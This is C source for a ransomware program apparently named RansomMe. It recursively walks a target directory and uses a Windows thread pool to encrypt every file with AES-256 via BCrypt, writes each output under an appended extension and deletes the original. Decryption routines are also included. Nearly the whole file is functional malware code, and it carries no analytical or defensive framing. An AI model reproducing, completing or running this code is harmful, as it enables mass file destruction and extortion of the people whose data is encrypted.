#include "RansomMe.h"

// Struct with all the parameters to be passed to the FileEncryptWorker callback function
typedef struct {
    char filePath[MAX_PATH];            // path of the file to be encrypted
    const char* cryptoFileExt;          // extension to be appended to the encrypted file
    BCRYPT_KEY_HANDLE hKey;             // encryption key
    BCRYPT_ALG_HANDLE hRng;             // RNG algorithm provider
    HANDLE* available;                   // signal to tell the WaitForSingleObject function that the struct is available (not being used by other thread)
    size_t count;                       // to count the number of encrypted files
} FileEncryptTask;

// static functions
static VOID CALLBACK FileEncryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work);
static VOID CALLBACK FileDecryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work);
static size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, BCRYPT_KEY_HANDLE hKey, TP_CALLBACK_ENVIRON* poolEnv, FileEncryptTask* taskPool, HANDLE* aEvents, DWORD threadNum);
static size_t DecryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* decryptedFileNumber, BCRYPT_KEY_HANDLE hKey, TP_CALLBACK_ENVIRON* poolEnv, FileEncryptTask* taskPool, HANDLE* aEvents, DWORD threadNum);

// initialize the threadpool, poolEnv will point to the pool environment and cleanupgroup to the cleanup group handler
BOOL InitThreadPool(TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP* cleanupgroup, DWORD threadNum) {
    PTP_POOL pool = NULL;       // the pool pointer used in CreateThreadPool

    // Create thread pool   
    pool = CreateThreadpool(NULL);
    if (!pool) {
        printf("Error: Failed to create thread pool. Error Code: %lu\n", GetLastError());
        return FALSE;
    }

    // Create thread pool environment
    InitializeThreadpoolEnvironment(poolEnv);
    SetThreadpoolThreadMaximum(pool, threadNum); // Set maximum threads

    // Set minimum threads
    if (!SetThreadpoolThreadMinimum(pool, MIN_THREADS)) {
        printf("SetThreadpoolThreadMinimum failed. LastError: %lu\n", GetLastError());
        CloseThreadpool(pool);
        return FALSE;
    }

    // Create a cleanup group
    *cleanupgroup = CreateThreadpoolCleanupGroup();
    if (cleanupgroup == NULL) {
        printf("CreateThreadpoolCleanupGroup failed. LastError: %lu\n", GetLastError());
        CloseThreadpool(pool);
        return FALSE;
    }

    // Associate the callback environment with our thread pool.
    SetThreadpoolCallbackPool(poolEnv, pool);

    // Associate the cleanup group with our thread pool.
    // Objects created with the same callback environment
    // as the cleanup group become members of the cleanup group.
    SetThreadpoolCallbackCleanupGroup(poolEnv, *cleanupgroup, NULL);

    return TRUE;
}

// This function will initialize the FileEncryptTask structs and call EncryptAllFiles. Finally it will securely close the thread handlers and finish up the encrypted files count
size_t StartEncryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, BCRYPT_KEY_HANDLE hKey, BCRYPT_ALG_HANDLE* hRng, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup, DWORD threadNum) {
    size_t fileCount = 0;
    FileEncryptTask* taskPool = NULL;
    HANDLE* aEvents = NULL;

    // Allocate memory for the array of FileEncryptTask structs
    taskPool = (FileEncryptTask*)malloc(threadNum * sizeof(FileEncryptTask));
    if (taskPool == NULL) {
        printf("Failed to allocate memory for FileEncryptTask struct array.\n");
        goto cleanup;
    }

    // Allocate memory for the array of HANDLE in every FileEncryptTask struct
    aEvents = (HANDLE*)malloc(threadNum * sizeof(HANDLE));
    if (aEvents == NULL) {
        printf("Failed to allocate memory for aEvetns HANDLE* array.\n");
        goto cleanup;
    }

    // Initialize the taskPool array
    for (int i = 0; i < threadNum; i++) {
        taskPool[i].filePath[0] = '\0';                                 // initialize file path as empty
        taskPool[i].cryptoFileExt = cryptoFileExt;                      // the crypto extension
        taskPool[i].hKey = hKey;                                        // the symmetric key handler
        taskPool[i].hRng = *hRng;                                       // the handler for the RNG provider
        taskPool[i].count = 0;                                          // initialize the count

        // Setup an event to tell WaitForSingleObject when a struct is available
        aEvents[i] = CreateEvent(NULL, TRUE, TRUE, NULL);               // Manual reset, initially signaled
        if (!aEvents[i]) {
            printf("Error: Failed to create event for task pool. Error Code: %lu\n", GetLastError());
            goto cleanup;
        }

        // point every struct pointer to the HANDLES
        taskPool[i].available = &aEvents[i];
    }

    // Call the encryption function
    fileCount = EncryptAllFiles(targetDir, cryptoFileExt, encryptedFileNumber, hKey, poolEnv, taskPool, aEvents, threadNum);

    // Clean up the thread pool, this will wait for all callbacks to finish, even those that are waiting to start
    if (cleanupgroup) {
        CloseThreadpoolCleanupGroupMembers(cleanupgroup, FALSE, NULL);
    }

    // Add all counts
    *encryptedFileNumber = 0;
    for (int i = 0; i < threadNum; i++) {
        *encryptedFileNumber += taskPool[i].count;
    }

cleanup:
    if (taskPool) { free(taskPool); }
    if (aEvents) { free(aEvents); }

    return fileCount;
}

// this will initialize the FileEncryptTask structs and call DecryptAllFiles. Finally it will securely close the thread handlers and finish up the decrypted files count
size_t startDecryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* decryptedFileNumber, BCRYPT_KEY_HANDLE hKey, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup, DWORD threadNum) {
    size_t fileCount = 0;
    FileEncryptTask* taskPool = NULL;
    HANDLE* aEvents = NULL;

    // Allocate memory for the array of FileEncryptTask structs
    taskPool = (FileEncryptTask*)malloc(threadNum * sizeof(FileEncryptTask));
    if (taskPool == NULL) {
        printf("Failed to allocate memory for FileEncryptTask struct array.\n");
        goto cleanup;
    }

    // Allocate memory for the array of HANDLE in every FileEncryptTask struct
    aEvents = (HANDLE*)malloc(threadNum * sizeof(HANDLE));
    if (aEvents == NULL) {
        printf("Failed to allocate memory for aEvetns HANDLE* array.\n");
        goto cleanup;
    }

    for (int i = 0; i < threadNum; i++) {
        taskPool[i].filePath[0] = '\0';                                 // initialize file path as empty
        taskPool[i].cryptoFileExt = cryptoFileExt;                      // the crypto extension
        taskPool[i].hKey = hKey;                                        // the symmetric key handler
        taskPool[i].hRng = NULL;                                        // the RNG provider is not used in the decryption
        taskPool[i].count = 0;                                          // initialize the count

        // Setup an event to tell WaitForSingleObject when a struct is available
        aEvents[i] = CreateEvent(NULL, TRUE, TRUE, NULL);               // Manual reset, initially signaled
        if (!aEvents[i]) {
            printf("Error: Failed to create event for task pool. Error Code: %lu\n", GetLastError());
            goto cleanup;
        }

        // point every struct pointer to the HANDLES
        taskPool[i].available = &aEvents[i];
    }

    fileCount = DecryptAllFiles(targetDir, cryptoFileExt, decryptedFileNumber, hKey, poolEnv, taskPool, aEvents, threadNum);

    // Clean up the thread pool, this will wait for all callbacks to finish, even those that are waiting to start
    if (cleanupgroup) {
        CloseThreadpoolCleanupGroupMembers(cleanupgroup, FALSE, NULL);
    }

    // Add all counts
    *decryptedFileNumber = 0;
    for (int i = 0; i < threadNum; i++) {
        *decryptedFileNumber += taskPool[i].count;
    }

cleanup:
    if (taskPool) { free(taskPool); }
    if (aEvents) { free(aEvents); }

    return fileCount;
}

// The callback function to be called by CreateThreadpoolWork when a new work sent to the pool
static VOID CALLBACK FileEncryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work) {
    UNREFERENCED_PARAMETER(instance);                               // instance will not be used
    UNREFERENCED_PARAMETER(work);                                   // work will not be used
    FileEncryptTask* taskParam = (FileEncryptTask*)parameter;       // taskParam will point to the FileEncryptTask struct

    //--------------- encryptfile code
    NTSTATUS status = 0;                        // flag with the status from bcrypt
    BOOL success = FALSE;                       // success flag

    BYTE rgbIV[AES256_IV_SIZE];                 // to store the IV used in the encryption
    BYTE pbIV[AES256_IV_SIZE];                  // the IV is modified in every BCryptEncrypt call, so we use a temp array

    HANDLE hInput = INVALID_HANDLE_VALUE;       // input file handle
    HANDLE hOutput = INVALID_HANDLE_VALUE;      // output file handle

    char outputFilePath[MAX_PATH] = "";         // output file path

    BYTE pbPlainText[CHUNK_SIZE];               // to store the plaintext chunks read from the input file
    BYTE pbCipherText[ENC_CHUNK_SIZE];          // to store the encrypted chunks to be written to the output file

    DWORD cbPlainText = 0;                      // size of the plaintext chunk
    DWORD cbCipherText = 0;                     // size of the encrypted chunk
    DWORD bytesWritten = 0;                     // bytes written to the output file

    // the output file will be the original file plus the crypted extension appended
    strcpy_s(outputFilePath, MAX_PATH, taskParam->filePath);
    if (my_strcat_s(outputFilePath, MAX_PATH, taskParam->cryptoFileExt) != 0) {
        printf("Cannot append the crypted extension to file name %s.\n", outputFilePath);
        goto cleanup;
    }

    // Open the input file for reading
    hInput = CreateFileA(taskParam->filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInput == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening input file: %lu\n", GetLastError());
        goto cleanup;
    }

    // Open the output file for writing
    hOutput = CreateFileA(outputFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutput == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening output file: %lu\n", GetLastError());
        goto cleanup;
    }

    // Generate a random IV
    status = BCryptGenRandom(taskParam->hRng, rgbIV, AES256_IV_SIZE, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error generating random IV: 0x%x\n", status);
        goto cleanup;
    }

    // Write the IV at the begining of the output file
    if (!WriteFile(hOutput, rgbIV, AES256_IV_SIZE, &bytesWritten, NULL) || bytesWritten != AES256_IV_SIZE) {
        fprintf(stderr, "Error writing the IV to the output file: %lu\n", GetLastError());
        goto cleanup;
    }

    // Encrypt the file in chunks
    while (ReadFile(hInput, pbPlainText, CHUNK_SIZE, &cbPlainText, NULL) && cbPlainText > 0) {
        // Copy the IV to a temporal value, because BCryptEncrypt modifies it
        memcpy(pbIV, rgbIV, AES256_IV_SIZE);

        // If if is the last chunk we include the flag BCRYPT_BLOCK_PADDING 
        if (cbPlainText < CHUNK_SIZE) {
            status = BCryptEncrypt(taskParam->hKey, pbPlainText, cbPlainText, NULL, (PUCHAR)pbIV, AES256_BLOCK_SIZE, pbCipherText, ENC_CHUNK_SIZE, &cbCipherText, BCRYPT_BLOCK_PADDING);
        }
        else {
            status = BCryptEncrypt(taskParam->hKey, pbPlainText, cbPlainText, NULL, (PUCHAR)pbIV, AES256_BLOCK_SIZE, pbCipherText, ENC_CHUNK_SIZE, &cbCipherText, 0);
        }

        // Check if there were any errors while encrypting
        if (!BCRYPT_SUCCESS(status)) {
            fprintf(stderr, "Error encrypting chunk: 0x%x\n", status);
            goto cleanup;
        }

        // Write the encrypted chunk to the output file
        if (!WriteFile(hOutput, pbCipherText, cbCipherText, &bytesWritten, NULL) || bytesWritten != cbCipherText) {
            fprintf(stderr, "Error writing encrypted chunk: %lu\n", GetLastError());
            goto cleanup;
        }
    }

    // add 1 to the encrypted files count only if it got here
    taskParam->count++;
    success = TRUE;

cleanup:
    // Release the file handlers
    if (hInput != INVALID_HANDLE_VALUE) CloseHandle(hInput);
    if (hOutput != INVALID_HANDLE_VALUE) CloseHandle(hOutput);

    if (success) {
        // Delete the input file only if the decryption was successful
        if (!DeleteFileA(taskParam->filePath)) {
            printf("Error: Could not delete input file %s. Error Code: %lu\n", taskParam->filePath, GetLastError());
        }
    }
    else {
        // if something went wrong delete the created file if it was created
        if (!DeleteFileA(outputFilePath)) {
            printf("Error: Could not delete output file %s. Error Code: %lu\n", outputFilePath, GetLastError());
        }
    }

    // ---------------------------------------------

    taskParam->filePath[0] = '\0';           // clear the file name (this is optional)
    SetEvent(*taskParam->available);         // set the struct as available
    return;
}

// The callback function to be called by CreateThreadpoolWork when a new work sent to the pool
static VOID CALLBACK FileDecryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work) {
    UNREFERENCED_PARAMETER(instance);                               // instance will not be used
    UNREFERENCED_PARAMETER(work);                                   // work will not be used
    FileEncryptTask* taskParam = (FileEncryptTask*)parameter;       // taskParam will point to the FileEncryptTask struct
    
    //--------------- decryptfile code
    NTSTATUS status = 0;
    BOOL success = FALSE;

    BYTE rgbIV[AES256_IV_SIZE];
    BYTE pbIV[AES256_IV_SIZE];

    HANDLE hInput = INVALID_HANDLE_VALUE;
    HANDLE hOutput = INVALID_HANDLE_VALUE;

    char outputFilePath[MAX_PATH] = "";

    BYTE pbPlainText[CHUNK_SIZE];
    BYTE pbCipherText[ENC_CHUNK_SIZE];

    DWORD cbPlainText = 0;
    DWORD cbCipherText = 0;
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;

    const char* inputFileExt = strrchr(taskParam->filePath, '.');

    // if the input file does not contain the crypted extension, skip the decryption
    if (strcmp(inputFileExt, taskParam->cryptoFileExt)) { goto cleanup; }
    else {
        // The outputFileName will be the inputFileName without the cryptoFileExt
        strncpy_s(outputFilePath, MAX_PATH, taskParam->filePath, inputFileExt - taskParam->filePath);

        // Open the input file
        hInput = CreateFileA(taskParam->filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hInput == INVALID_HANDLE_VALUE) {
            printf("Error: Could not open input file %s. Error Code: %lu\n", taskParam->filePath, GetLastError());
            goto cleanup;
        }

        // Open the output file
        hOutput = CreateFileA(outputFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hOutput == INVALID_HANDLE_VALUE) {
            printf("Error: Could not open output file %s. Error Code: %lu\n", outputFilePath, GetLastError());
            goto cleanup;
        }

        // Read the IV at the begining of the input file
        if (!ReadFile(hInput, rgbIV, AES256_IV_SIZE, &bytesRead, NULL) || bytesRead != AES256_IV_SIZE) {
            fprintf(stderr, "Error reading the IV from the input file: %lu\n", GetLastError());
            goto cleanup;
        }

        // Decrypt and write the file data in chunks
        while (ReadFile(hInput, pbCipherText, CHUNK_SIZE, &cbCipherText, NULL) && cbCipherText > 0) {
            // Copy the IV to a temporal value, because BCryptEncrypt modifies it
            memcpy(pbIV, rgbIV, AES256_IV_SIZE);

            // If if is the last chunk we include the flag BCRYPT_BLOCK_PADDING 
            if (cbCipherText < CHUNK_SIZE) {
                status = BCryptDecrypt(taskParam->hKey, pbCipherText, cbCipherText, NULL, (PUCHAR)pbIV, AES256_BLOCK_SIZE, pbPlainText, CHUNK_SIZE, &cbPlainText, BCRYPT_BLOCK_PADDING);
            }
            else {
                status = BCryptDecrypt(taskParam->hKey, pbCipherText, cbCipherText, NULL, (PUCHAR)pbIV, AES256_BLOCK_SIZE, pbPlainText, CHUNK_SIZE, &cbPlainText, 0);
            }

            // Check if there were any errors while encrypting
            if (!BCRYPT_SUCCESS(status)) {
                fprintf(stderr, "Error decrypting chunk: 0x%x\n", status);
                goto cleanup;
            }

            // Write the decrypted chunk to the output file
            if (!WriteFile(hOutput, pbPlainText, cbPlainText, &bytesWritten, NULL) || bytesWritten != cbPlainText) {
                printf("Error: WriteFile failed. Error Code: %lu\n", GetLastError());
                printf("Failure writing to file %s\n", outputFilePath);
                goto cleanup;
            }
        }
    }

    // add 1 to the encrypted files count only if it got here
    taskParam->count++;
    success = TRUE;

cleanup:
    if (hInput != INVALID_HANDLE_VALUE) CloseHandle(hInput);
    if (hOutput != INVALID_HANDLE_VALUE) CloseHandle(hOutput);

    // Delete the input file only if the decryption was successful
    if (success) {
        if (!DeleteFileA(taskParam->filePath)) {
            printf("Error: Could not delete input file %s. Error Code: %lu\n", taskParam->filePath, GetLastError());
        }
    }
    // if something went wrong delete the created file if it was created
    else {
        if (outputFilePath[0] != '\0') {
            if (!DeleteFileA(outputFilePath)) {
                printf("Error: Could not delete output file %s. Error Code: %lu\n", outputFilePath, GetLastError());
            }
        }
    }

    // ------------------------------------------------------
    taskParam->filePath[0] = '\0';          // clear the file name (this is optional)
    SetEvent(*taskParam->available);         // set the struct as available
    return;
}

// given a target directory this will crawl into it and call EncryptMyFile for every file found on it and its subdirectories
static size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, BCRYPT_KEY_HANDLE hKey, TP_CALLBACK_ENVIRON* poolEnv, FileEncryptTask* taskPool, HANDLE* aEvents, DWORD threadNum) {
    WIN32_FIND_DATAA foundFileData;          // WIN32_FIND_DATA containing the file/directory info
    HANDLE hFind = INVALID_HANDLE_VALUE;     // search handle to be used with findNextFile

    size_t fileCount = 0;                    // number of files found

    char targetSubDir[MAX_PATH] = "";        // temporary variable to store the subdir
    char findTargetDir[MAX_PATH] = "";       // just to add an asterisk to the end of the targetDir but without affecting the original string
    char fullFileName[MAX_PATH] = "";        // the full file name with path to pass to EncryptMyFile

    PTP_WORK work = NULL;
    FileEncryptTask* task = NULL;            // pointer to the working task
    DWORD index = 0;                         // index of the available task

    // if targetDir does not end with \ we will add it as it will be more convinient later
    if (targetDir[strlen(targetDir)] != '\\') {
        if (my_strcat_s(targetDir, MAX_PATH, "\\") != 0) {
            printf("Skipping directory %s. Cannot append '\\'. Name might be too long.\n", targetDir);
            return fileCount;
        }
    }
    // creating a copy of the dir and adding * to the end to pass it to the FindFirstFile function
    strcpy_s(findTargetDir, MAX_PATH, targetDir);
    if (my_strcat_s(findTargetDir, MAX_PATH, "*") != 0) {
        printf("Skipping directory %s. Cannot append '*'. Name might be too long.\n", targetDir);
        return fileCount;
    }

    // Find the first file in the directory.
    hFind = FindFirstFileA(findTargetDir, &foundFileData);

    if (INVALID_HANDLE_VALUE == hFind) {
        printf("Error: FindFirstFile failed. Error Code: %lu\n", GetLastError());
        return fileCount;
    }

    do {
        // check if it is a directory
        if (foundFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip "." and ".." directories
            if (strcmp(foundFileData.cFileName, ".") == 0 || strcmp(foundFileData.cFileName, "..") == 0) {
                continue;
            }
            // If it's a directory, append the folder name to the original target dir
            strcpy_s(targetSubDir, MAX_PATH, targetDir);
            if (my_strcat_s(targetSubDir, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping directory %s. Cannot append subdir %s. Name might be too long.\n", targetDir, foundFileData.cFileName);
                continue;
            }

            // recursively call with every subfolder and add the number to the total files
            fileCount += EncryptAllFiles(targetSubDir, cryptoFileExt, encryptedFileNumber, hKey, poolEnv, taskPool, aEvents, threadNum);
        }
        else {
            // If it's a file, encrypt it
            // Add 1 to the total file count
            fileCount++;

            // Point the next available struct to task. A round robin is used with fileCount % threadNum
//            task = &taskPool[fileCount % threadNum];
            // Block until the event is signaled
//            WaitForSingleObject(task->available, INFINITE);

            // Mark the task as in-use by resetting the event
//            ResetEvent(task->available);

            index = WaitForMultipleObjects(threadNum, aEvents, FALSE, INFINITE);
            if (index == WAIT_FAILED || index == WAIT_TIMEOUT) {
                printf("Error: Failed to wait for multiple objects. Error Code: %lu\n", GetLastError());
                continue;
            }
            else {
                task = &taskPool[index];
                ResetEvent(*task->available);
            }

            // Copy the current dir and append the found file name to task->filePath
            strcpy_s(task->filePath, MAX_PATH, targetDir);
            if (my_strcat_s(task->filePath, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping file %s in dir %s. Name might be too long.\n", foundFileData.cFileName, targetDir);
                task->filePath[0] = '\0';   // Clear the filePath in case of failure
                SetEvent(*task->available);  // Mark the task as free in case of failure
                continue;
            }

            // Submit the task to the thread pool
            work = CreateThreadpoolWork(FileEncryptWorker, task, poolEnv);
            if (!work) {
                printf("Error: Failed to create thread pool work. Error Code: %lu\n", GetLastError());
                task->filePath[0] = '\0';   // Clear the filePath in case of failure
                SetEvent(*task->available);  // Mark the task as free in case of failure
                continue;
            }

            // Submit the work
            SubmitThreadpoolWork(work);
        }
    } while (FindNextFileA(hFind, &foundFileData) != 0);

    // Close the search handle
    FindClose(hFind);

    // Return the total files found
    return fileCount;
}

// given a target directory this will crawl into it and call DecryptMyFile for every file found on it and its subdirectories
static size_t DecryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* decryptedFileNumber, BCRYPT_KEY_HANDLE hKey, TP_CALLBACK_ENVIRON* poolEnv, FileEncryptTask* taskPool, HANDLE* aEvents, DWORD threadNum) {
    WIN32_FIND_DATAA foundFileData;          // WIN32_FIND_DATA containing the file/directory info
    HANDLE hFind = INVALID_HANDLE_VALUE;     // search handle to be used with findNextFile

    size_t fileCount = 0;                    // number of files found

    char targetSubDir[MAX_PATH] = "";        // temporary variable to store the subdir
    char findTargetDir[MAX_PATH] = "";       // just to add an asterisk to the end of the targetDir but without affecting the original string
    char fullFileName[MAX_PATH] = "";        // the full file name with path to pass to DecryptMyFile

    PTP_WORK work = NULL;
    FileEncryptTask* task = NULL;            // pointer to the working task
    DWORD index = 0;                         // index of the available task

    // if targetDir does not end with \ we will add it as it will be more convinient later
    if (targetDir[strlen(targetDir)] != '\\') {
        if (my_strcat_s(targetDir, MAX_PATH, "\\") != 0) {
            printf("Skipping directory %s. Cannot append '\\'. Name might be too long.\n", targetDir);
            return fileCount;
        }
    }
    // creating a copy of the dir and adding * to the end to pass it to the FindFirstFile function
    strcpy_s(findTargetDir, MAX_PATH, targetDir);
    if (my_strcat_s(findTargetDir, MAX_PATH, "*") != 0) {
        printf("Skipping directory %s. Cannot append '*'. Name might be too long.\n", targetDir);
        return fileCount;
    }

    // Find the first file in the directory.
    hFind = FindFirstFileA(findTargetDir, &foundFileData);

    if (INVALID_HANDLE_VALUE == hFind) {
        printf("Error: FindFirstFile failed. Error Code: %lu\n", GetLastError());
        return fileCount;
    }

    do {
        // check if it is a directory
        if (foundFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip "." and ".." directories
            if (strcmp(foundFileData.cFileName, ".") == 0 || strcmp(foundFileData.cFileName, "..") == 0) {
                continue;
            }
            // If it's a directory, append the folder name to the original target dir
            strcpy_s(targetSubDir, MAX_PATH, targetDir);
            if (my_strcat_s(targetSubDir, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping directory %s. Cannot append subdir %s. Name might be too long.\n", targetDir, foundFileData.cFileName);
                continue;
            }

            // recursively call with every subfolder and add the number to the total files
            fileCount += DecryptAllFiles(targetSubDir, cryptoFileExt, decryptedFileNumber, hKey, poolEnv, taskPool, aEvents, threadNum);
        }
        else {
            // If it's a file, decrypt it
            // Add 1 to the total file count
            fileCount++;

            // Point the next available struct to task. A round robin is used with fileCount % threadNum
//            task = &taskPool[fileCount % threadNum];
            // Block until the event is signaled
//            WaitForSingleObject(task->available, INFINITE);

            // Mark the task as in-use by resetting the event
//            ResetEvent(task->available);

            index = WaitForMultipleObjects(threadNum, aEvents, FALSE, INFINITE);
            if (index == WAIT_FAILED || index == WAIT_TIMEOUT) {
                printf("Error: Failed to wait for multiple objects. Error Code: %lu\n", GetLastError());
                continue;
            }
            else {
                task = &taskPool[index];
                ResetEvent(*task->available);
            }

            // Copy the current dir and append the found file name to task->filePath
            strcpy_s(task->filePath, MAX_PATH, targetDir);
            if (my_strcat_s(task->filePath, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping file %s in dir %s. Name might be too long.\n", foundFileData.cFileName, targetDir);
                task->filePath[0] = '\0';   // Clear the filePath in case of failure
                SetEvent(*task->available);  // Mark the task as free in case of failure
                continue;
            }

            // Submit the task to the thread pool
            work = CreateThreadpoolWork(FileDecryptWorker, task, poolEnv);
            if (!work) {
                printf("Error: Failed to create thread pool work. Error Code: %lu\n", GetLastError());
                task->filePath[0] = '\0';   // Clear the filePath in case of failure
                SetEvent(*task->available);  // Mark the task as free in case of failure
                continue;
            }

            // Submit the work
            SubmitThreadpoolWork(work);
        }
    } while (FindNextFileA(hFind, &foundFileData) != 0);

    // Close the search handle
    FindClose(hFind);

    // Return the total files found
    return fileCount;
}